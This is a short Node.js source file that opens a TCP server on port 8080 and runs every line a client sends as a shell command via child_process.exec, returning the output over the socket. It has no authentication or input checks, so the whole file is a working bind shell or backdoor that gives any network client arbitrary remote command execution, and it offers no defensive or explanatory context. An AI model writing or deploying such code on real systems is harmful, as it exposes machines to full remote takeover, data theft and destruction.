const net = require('net');

const PORT = 8080;

const server = net.createServer((socket) => {
  console.log('Client connected:', socket.remoteAddress);

  socket.on('data', (data) => {
    const command = data.toString().trim();
    console.log('Received command:', command);

    // Execute the command using child_process.exec()
    const { exec } = require('child_process');
    exec(command, (error, stdout, stderr) => {
      if (error) {
        console.error(`exec error: ${error}`);
        socket.write(`Error executing command: ${error.message}\n`);
        return;
      }
      socket.write(stdout);
      if (stderr) {
        socket.write(`stderr: ${stderr}`);
      }
    });
  });

  socket.on('end', () => {
    console.log('Client disconnected');
  });
});

server.listen(PORT, () => {
  console.log(`Server listening on port ${PORT}`);
});
